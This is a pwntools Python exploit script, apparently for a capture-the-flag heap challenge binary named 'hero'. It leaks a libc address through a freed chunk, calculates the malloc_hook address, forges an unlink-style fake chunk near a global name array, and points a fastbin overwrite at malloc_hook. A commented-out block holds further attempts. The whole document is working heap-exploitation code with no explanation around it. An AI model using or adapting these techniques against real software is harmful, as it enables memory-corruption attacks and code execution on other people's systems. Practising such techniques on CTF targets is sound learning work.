from pwn import *
context.log_level='debug'

debug = 1
if debug:
	p = process('./hero')
	
def add(name,power):
	p.sendlineafter("Your choice: ",'1')
	p.sendafter("What's your hero's name:\n",name)
	p.sendafter("What's your hero's power:\n",power)

def show(idx):
	p.sendlineafter("Your choice: ",'2')
	p.sendlineafter("What hero do you want to show?\n",str(idx))

def edit(idx,name,power):
	p.sendlineafter("Your choice: ",'3')
	p.sendlineafter("What hero do you want to edit?\n",str(idx))
	p.sendafter("What's your hero's name:\n",name)
	p.sendafter("What's your hero's power:\n",power)

def remove(idx):
	p.sendlineafter("Your choice: ",'4')
	p.sendlineafter("What hero do you want to remove?\n",str(idx))

name_addr = 0x602160

add('000\n','000\n')#0 name0 power0
add('111\n','111\n')#1
add('222\n','222\n')#2 
add('333\n','333\n')#3

#gdb.attach(p,'b *0x400d55')
remove(1)
add('111\n','1111111\n')#1
show(1)
p.recvuntil('Power:1111111\n')
libc_addr = u64(p.recvline()[:-1].ljust(8,'\x00'))-3951480
log.info("libc_addr:%#x",libc_addr)
malloc_hook = libc_addr+3951376
#sys_addr = libc_addr+
log.info("malloc_hook:%#x",malloc_hook)

edit(2,p64(0)+p64(0x61)+p64(name_addr+16-24)+p64(name_addr+16-16)+'a'*0x40+p64(0x60),'222\n')

gdb.attach(p)
edit(2,'a'*8+p64(malloc_hook-0x23),'222\n')
'''
add('333\n','333\n')#3

remove(1)
edit(3,'333\n','333\n')
edit(3,'3'*0x68,'333\n')
gdb.attach(p)
#add(p64(0)+p64(0x61)+p64(name_addr+24-24)+p64(name_addr+24-16)+'a'*0x40+p64(0x60),'111\n')#add 1,overwrite 3's name size

remove(3)
#remove(1)

#gdb.attach(p,'b *0x400e1c')
#edit(1,'a'*16+p64(malloc_hook-0x23),'111')
'''
p.interactive()

